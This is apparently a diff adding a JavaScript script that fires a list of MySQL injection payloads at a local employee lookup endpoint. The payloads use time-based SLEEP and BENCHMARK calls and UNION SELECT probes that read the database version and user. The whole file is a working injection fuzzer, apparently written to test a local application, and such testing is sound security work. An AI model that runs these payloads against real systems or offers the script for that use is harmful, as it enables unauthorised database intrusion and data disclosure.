@@ -1,0 +1,53 @@
+const dataSet = [
+  "ORDER BY SLEEP(5)",
+  "ORDER BY 1,SLEEP(5)",
+  "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",
+  "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",
+  "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",
+  "ORDER BY SLEEP(5)#",
+  "ORDER BY 1,SLEEP(5)#",
+  "ORDER BY 1,SLEEP(5),3#",
+  "ORDER BY 1,SLEEP(5),3,4#",
+  "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",
+  "ORDER BY SLEEP(5)-- ",
+  "ORDER BY 1,SLEEP(5)-- ",
+  "ORDER BY 1,SLEEP(5),3-- ",
+  "ORDER BY 1,SLEEP(5),3,4-- ",
+  "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- ",
+  "UNION ALL SELECT 1",
+  "UNION ALL SELECT 1,2",
+  "UNION ALL SELECT 1,2,3",
+  "UNION ALL SELECT 1#",
+  "UNION ALL SELECT 1,2#",
+  "UNION ALL SELECT 1,2,3#",
+  "UNION ALL SELECT 1,2,3,4#",
+  "UNION ALL SELECT 1-- ",
+  "UNION ALL SELECT 1,2-- ",
+  "UNION ALL SELECT 1,2,3-- ",
+  "UNION ALL SELECT 1,2,3,4-- ",
+  "UNION SELECT @@VERSION,SLEEP(5),3",
+  "UNION SELECT @@VERSION,SLEEP(5),USER(),4",
+  "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
+  "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",
+  "UNION SELECT @@VERSION,SLEEP(5),'3",
+  "UNION SELECT @@VERSION,SLEEP(5),\"'3'\"#",
+  "UNION SELECT @@VERSION,SLEEP(5),USER(),4#",
+  "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",
+  "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",
+  "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--",
+  "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--",
+];
+
+async function fetchData(data) {
+  try {
+    const response = await fetch(`http://localhost:3000/employee?id=${data}`);
+    const json = await response.json();
+    console.log(json);
+  } catch (error) {
+    console.error(error);
+  }
+}
+
+dataSet.forEach((data) => {
+  fetchData(data);
+});
